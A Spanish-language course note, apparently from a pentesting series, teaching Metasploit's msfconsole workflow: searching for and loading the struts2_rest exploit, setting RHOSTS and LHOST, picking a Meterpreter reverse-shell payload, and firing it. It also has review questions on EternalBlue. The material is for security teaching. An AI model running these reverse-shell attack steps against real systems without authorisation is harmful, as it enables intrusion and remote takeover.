# 04 - El Ecosistema MSFconsole (Búsqueda y Configuración)

## 🎯 Objetivos
- Ingresar a la consola interactiva `msfconsole`.
- Aprender los comandos universales para configurar un ataque (search, use, show, set).
- Entender la lógica de los Parámetros Globales (RHOSTS y LHOST).

---

## 🧠 Concepto: La Consola del Hacker

Atrás quedaron las bases teóricas. Cuando se inicia Metasploit (tipeando `msfconsole` en una terminal de Linux/Kali), no se abre una aplicación gráfica con clics. Se abre una Interfaz de Línea de Comandos (CLI) interactiva, conectada a una Base de Datos PostgreSQL donde residen casi 5.000 módulos y exploits listos para usarse.

La curva de aprendizaje de Metasploit puede intimidar, pero su diseño es brillante porque estandariza **todos** los ataques. 
No importa si estás hackeando un Windows Server, un iPhone, o el Router de tu casa; la sintaxis y los 5 pasos que tenés que seguir en la consola son exactamente los mismos siempre.

---

## 🛠️ Los 5 Pasos Universales del Ataque en MSF

### Paso 1: Encontrar el Arma (`search`)
Sabés que el objetivo corre un Servidor Apache vulnerable antiguo. Buscás qué tiene el framework para ofrecer.
> `msf6 > search apache type:exploit`

### Paso 2: Cargar el Arma (`use`)
Encontraste un exploit llamado `struts2_rest`. Le decís a la consola que "equipe" este módulo en particular.
> `msf6 > use exploit/multi/http/struts2_rest`
*(Notarás que el texto de la consola cambia a color rojo y te muestra que ahora estás "adentro" del exploit).*

### Paso 3: Ver las Opciones (`show options`)
Esta es la parte más importante. Le preguntás al exploit: *"¿Qué parámetros obligatorios necesitás que te configure para poder disparar?"*
> `msf6 exploit(struts) > show options`
La consola desplegará una tabla con dos grandes secciones: Module Options (opciones del exploit) y Payload Options (opciones de la cabeza nuclear).

### Paso 4: Apuntar y Configurar (`set`)
Tenés que llenar los datos faltantes que marcaban `Required: Yes` en la tabla anterior.
Los dos parámetros que usarás toda tu vida (memorizalos):
- **`RHOSTS`** (Remote Hosts): La IP de tu víctima. Es a dónde va a impactar el misil. (Se configura usando: `set RHOSTS 192.168.1.50`).
- **`LHOST`** (Local Host): Tu propia IP de atacante. Se utiliza en Payloads de tipo Reverse Shell para indicarle a la víctima a qué IP de tu casa debe conectarse de regreso para entregarte el control. (Se configura usando: `set LHOST 10.0.0.5`).

Si querés cambiar el tipo de Payload que trae por defecto el exploit (Ej. cambiar de un simple Shell de texto a un avanzado Meterpreter):
> `msf6 exploit(struts) > set PAYLOAD linux/x64/meterpreter/reverse_tcp`

### Paso 5: Fuego (`exploit` o `run`)
Una vez configurado todo y verificado, das la orden de disparo.
> `msf6 exploit(struts) > exploit`

Metasploit se encargará de realizar el ataque de red en silencio, ensamblar las piezas de Payload, y si todo sale bien, te devolverá instantáneamente una terminal interactiva del sistema remoto. (Si tenés un error, suele ser porque configuraste mal tu IP LHOST o porque el Antivirus bloqueó la carga).

---

## 🧩 Variables Globales (`setg`)
Si en un pentesting vas a atacar durante 3 horas seguidas, configurando decenas de exploits distintos, va a ser aburrido escribir `set LHOST mi_ip` en cada módulo nuevo.
Si utilizás el comando `setg LHOST 10.0.0.5` (Set Global), Metasploit recordará tu IP para todos los futuros módulos que uses en esa sesión de consola, ahorrando muchísimo tiempo.

---

## 📌 Must Know (Imprescindible)
- **search**: Busca palabras clave de vulnerabilidades o software en la base de datos de Metasploit.
- **use**: Selecciona y entra al contexto del módulo.
- **show options**: Despliega la tabla de variables necesarias (Puertos, IPs) que hay que configurar.
- Conocer la santísima trinidad de variables de red: **`RHOSTS`** (IP de la Víctima a atacar), **`LHOST`** (IP del Atacante que recibirá la Shell Inversa), y **`LPORT`** (El Puerto en la máquina del Atacante que se pondrá en modo escucha).

---

## 🔄 Preguntas de repaso
1. Estás auditando una red local. Encontrás que la IP `192.168.5.150` tiene una vulnerabilidad SMB. Al cargar el exploit `ms17_010_eternalblue` en Metasploit, utilizás el comando `show options`. Ves una variable requerida llamada `RHOSTS` que está en blanco. ¿Qué valor exacto (Qué dirección IP) tenés que asignar usando el comando `set RHOSTS` para apuntar el arma correctamente?
2. Siguiendo con el caso anterior, tras apuntar el misil a la víctima, seleccionaste configurar como carga explosiva (payload) una Reverse Shell para evadir el Firewall de la víctima. Para que esto funcione, utilizas el comando `set LHOST 10.10.10.5` y `set LPORT 4444`. ¿De quién es esta IP `.5` que acabas de configurar en Metasploit y por qué el payload (una vez inyectado en el objetivo) necesita obligatoriamente esa información para cumplir su misión?
3. Un analista Junior está probando 5 vulnerabilidades (exploits) distintas sobre un mismo objetivo. En cada uno de ellos, se frustra teniendo que volver a escribir manualmente `set RHOSTS [IP_Victima]` y `set LHOST [IP_Atacante]` perdiendo valioso tiempo. ¿Qué comando derivado en `msfconsole` le recomendarías utilizar una sola vez para fijar esas variables como inamovibles durante el resto de toda su jornada en la terminal?

**➡️ Siguiente nota:** [[05 - Meterpreter (El Payload Supremo)]]
